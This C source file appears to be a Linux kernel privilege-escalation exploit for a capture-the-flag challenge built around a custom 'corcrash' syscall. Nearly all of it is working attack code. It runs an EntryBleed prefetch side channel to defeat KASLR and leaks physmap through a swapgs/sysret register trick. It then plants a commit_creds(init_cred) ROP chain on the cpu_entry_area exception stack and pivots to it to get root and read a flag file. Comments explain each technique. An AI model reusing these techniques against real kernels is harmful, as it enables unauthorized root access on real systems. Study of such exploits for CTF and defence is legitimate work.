#include <stddef.h>
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/sendfile.h>

// commands
#define DEV_PATH "" // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4 * PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

#define WAIT getc(stdin);
#define ulong unsigned long

#define errExit(msg)                                                           \
    do {                                                                       \
        perror(msg);                                                           \
        exit(EXIT_FAILURE);                                                    \
    } while (0)
#define KMALLOC(qid, msgbuf, N)                                                \
    for (int ix = 0; ix != N; ++ix) {                                          \
        if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1)        \
            errExit("KMALLOC");                                                \
    }

static void print_hex8(char *buf, size_t len) {
    uint64_t *tmp = (uint64_t *)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

struct pt_regs {
    ulong r15;
    ulong r14;
    ulong r13;
    ulong r12;
    ulong bp;
    ulong bx;
    ulong r11;
    ulong r10;
    ulong r9;
    ulong r8;
    ulong ax;
    ulong cx;
    ulong dx;
    ulong si;
    ulong di;
    ulong orig_ax;
    ulong ip;
    ulong cs;
    ulong flags;
    ulong sp;
    ulong ss;
};

static void print_regs(struct pt_regs *regs) {
    printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14,
           regs->r13, regs->r12);
    printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11,
           regs->r10);
    printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax,
           regs->cx);
    printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di,
           regs->ip);
    printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
           regs->sp, regs->ss);
}

int64_t user_cs, user_ss, user_rflags, user_sp;
static void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

int open_dev(void) {
    int fd = open("/dev/giraffe", O_RDWR);
    if (fd < 0) {
        errExit("open");
    }

    return fd;
}

/*
Entrybleed attack:
- prefetch = load byte from memory to location in cache hierachy
prefetch will finish quickly if address being loaded is already in TLB and finish
slower if it isn't (due to page table walk having to be done)
- KPTI = Kernel page table isolation. Kernel has all of userspace virtual memory
mapped. Userspace only minimal amount of kernel virtual memory, like exception/syscall
entry handlers and anything else necessary for the user to kernel transition.

Entrybleed issue: `entry_SYSCALL_64` symbol which is at a constant offset of KASLR,
is loaded into a LSTAR MST register inside `syscall_init` function, which gets executed
**before** switching to kernel. Therefore it is mapped in userspace and loaded into
TLB.

Why is TLB not invalidated when switching to kernel ? Because `global` bit is
set on PTE
    - global bit: tells the processor not to invalidate the TLB entry corresponding to the page upon a MOV to CR3 instruction.
    - global bit disabled for all pages except the ones being mapped in both user and kernel space:
        "global pages are disabled for all kernel structures not mapped into both kernel and userspace page tables"

Overall idea: repeatedly execute syscalls to ensure that the page with entry_SYSCALL_64
    (hence the name EntryBleed) gets cached in the instruction TLB, and then prefetch side-channel
    the possible range of addresses for that handler (as the kernel itself is guaranteed to be within 0xffffffff80000000 - 0xffffffffc0000000).


*/
uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define PHYSMAP_BOTTOM 0xffff888000000000ull
#define PHYSMAP_TOP 0xffffc88000000000ull

// step size probably based on kernel alignment such that 0x1000 wouldnt make sense
#define STEP 0x100000ull

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP


uint64_t prefetch_leak(uint64_t start, uint64_t end, uint64_t step)
{
    uint64_t size = (end - start) / step;
    uint64_t *data = calloc(size, sizeof(uint64_t));
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < size; idx++)
        {
            uint64_t test = start + idx * step;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < size; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = start + i * step;
        }
    }

    return addr;
}

void corcrash(uint64_t addr, uint64_t val) {
    syscall(470, addr, val);
}

void write_to_cpu_entry_area(void* buf) {
   asm volatile (".intel_syntax noprefix;"
    "mov rsp,rdi;"
	"pop r15;"
	"pop r14;"
	"pop r13;"
	"pop r12;"
	"pop rbp;"
	"pop rbx;"
	"pop r11;"
	"pop r10;"
	"pop r9;"
	"pop r8;"
	"pop rax;"
	"pop rcx;"
	"pop rdx;"
	"pop rsi;"
	"pop rdi;"
	"div qword ptr [0x1234000];"
    "1:;"
    "jmp 1b;"
    ".att_syntax;");
}

// REP STOSB      Write AL to [RDI] a total of ECX times.

// physmap = direct mapping of all phyiscal memory in kernel space
// -> can place our ropchain there

#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)

/*
#define CPU_ENTRY_AREA_RO_IDT		CPU_ENTRY_AREA_BASE
#define CPU_ENTRY_AREA_PER_CPU		(CPU_ENTRY_AREA_RO_IDT + PAGE_SIZE)

noinstr struct cpu_entry_area *get_cpu_entry_area(int cpu)
{
	unsigned long va = CPU_ENTRY_AREA_PER_CPU + cea_offset(cpu) * CPU_ENTRY_AREA_SIZE;
	BUILD_BUG_ON(sizeof(struct cpu_entry_area) % PAGE_SIZE != 0);

	return (struct cpu_entry_area *) va;
}
*/

// Virt: 0xfffffe0000001000 -> Phys: 0x7dc0a000
// => physmap offset is the same since 1:1 physical memory mapping
// => by leaking physmap we can leak cpu_entry_area
#define CPU_ENTRY_AREA_PHYS_ADDR 0x7dc0a000
#define SWAPGS_SYSRET		0x1ba

// We’ve recently seen KCTF entries where attackers take advantage of the non-randomized
// cpu_entry_area stacks in order to access data at a known virtual address in kernel accessible memory even in the presence of SMAP and KASLR.

// when corcrash is called:
// got control over rsi and rdi (same value though)

// stack pivot gadget
// 0xffffffff8158beaf : push rdi ; sti ; jmp qword ptr [rsi + 0x66]
uint64_t push_rdi_jmp_ptr_rsi = 0xffffffff8158beaf - 0xffffffff81000000;

// 0xffffffff8138e460 : pop rsp ; ret
uint64_t pop_rsp_ret_off = 0xffffffff8138e460 - 0xffffffff81000000;
uint64_t commit_creds_off = 0xffffffff812c7bc0 - 0xffffffff81000000;
// 0xffffffff812c5ead : pop rdi ; ret
uint64_t pop_rdi_ret_off = 0xffffffff812c5ead -  0xffffffff81000000;
uint64_t kpti_tramp_off = 0xffffffff81000ed0 - 0xffffffff81000000;

void handle(int s) {}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
        sendfile(1, open("/root/flag.txt", O_RDONLY), 0, 0x40);
	}
	exit(0);
}


// tldr;
// leak kernel_base using entrybleed attack
// leak phys_map using swapgs, sysret trick which leaks registers
// calculate cpu_entry_area from phys_map as it is at a constant offset
// put ropchain into exception stack (cea_exception_stacks) by causing an exception
// calculate exception_stack address based on cpu_enty_area address
// stack pivot to our ropchain stored in the cea exception stack
//
// reliability of exploit is at like 15%. Leak sometimes fails, or an interrupt occurs which
// overwrites our ropchain on the exception stack

// exploit usage:
// 1. Run without argument, leak physmap from r14
// 2. Run exploit and pass physmap address
int main(int argc, char** argv) {
    uint64_t kbase = prefetch_leak(KERNEL_LOWER_BOUND, KERNEL_UPPER_BOUND, STEP);
    uint64_t init_cred = kbase + 0x10611a0;
    uint64_t cur_task = kbase + 0x171f018;
    uint64_t pop_rdi_ret = kbase + pop_rdi_ret_off;
    uint64_t commit_creds = kbase + commit_creds_off;
    uint64_t kpti_tramp = kbase + kpti_tramp_off;
    uint64_t pop_rsp_ret = kbase + pop_rsp_ret_off;
    uint64_t swapgs_sysret = kbase+SWAPGS_SYSRET;
    uint64_t stack_pivot_gadget = kbase+push_rdi_jmp_ptr_rsi;

    info("Leak: %p \n", kbase);
    info("Gadget: %p \n", swapgs_sysret);
    info("Stack pivot gadget ?: %p \n", stack_pivot_gadget);
    info("Pop rsp ret ?: %p \n", pop_rsp_ret);

    if (argc == 1) {
        // Perform an “early” ret2user without clearing registers from kernel leaks,
        // with enough luck one of them will contain a physmap leak.
        //
        // To return to userland use syscall_return_via_sysret routine, which
        // terminates with swapgs; nop; sysretq.
        //
        // Given that kpti is off, there’s nothing else we need to do to complete the context switch.
        // Since rcx will be set to 0, which is a valid canonical address, this allows
        // us to return to userland and catch the segfault (because 0 is an invalid instruction pointer)
        // to leak the content of the registers.
        //
        // physmap leaked in r14
        corcrash(swapgs_sysret, 0);
    }
    else {
        char* end = NULL;
        uint64_t physmap = strtoull(argv[1], &end, 0x10) - 0x1052700;

        info("Physmap: %p \n", physmap);
        uint64_t cpu_entry_area = physmap + CPU_ENTRY_AREA_PHYS_ADDR;
        //uint64_t cpu_entry_area = CPU_ENTRY_AREA_BASE(0);
        info("Cpu_entry_area: %p \n", cpu_entry_area);
        uint64_t payload_loc = cpu_entry_area+0x9f58;
        info("Payload location: %p \n", payload_loc);
        info("jmp off: %p \n", payload_loc+0x66);

        char buf[15*8] = {0};
        memset(buf, 0x41, sizeof(buf));
        uint64_t* p_buf = (uint64_t*)buf;
        size_t off = 0x0;
        // pops `rdi` (payload_loc) from stack
        p_buf[off++] = pop_rdi_ret;
        p_buf[off++] = init_cred;
        p_buf[off++] = commit_creds;
        // swapgs; iret gadget
        // is enough since we don't have KPTI
        p_buf[off++] = kpti_tramp+58;

        save_state();
        p_buf[off++] = (uint64_t)get_shell;
        p_buf[off++] = user_cs;
        p_buf[off++] = user_rflags;
        p_buf[off++] = user_sp;
        p_buf[off++] = user_ss;

        *(uint64_t*)&buf[0x66] = pop_rsp_ret;

        signal(SIGFPE, handle);
        signal(SIGTRAP, handle);
        signal(SIGSEGV, handle);

        if (fork() == 0) {
            write_to_cpu_entry_area(buf);
        }

        usleep(500);
        // 0xffffffff8158beaf : push rdi ; sti ; jmp qword ptr [rsi + 0x66]
        // when corcrash is called, both rsi and rdi will contain `payload_loc`,
        // therefore `pop_rsp_ret` gadget will return to our ropchain
        corcrash(stack_pivot_gadget, payload_loc);
    }
}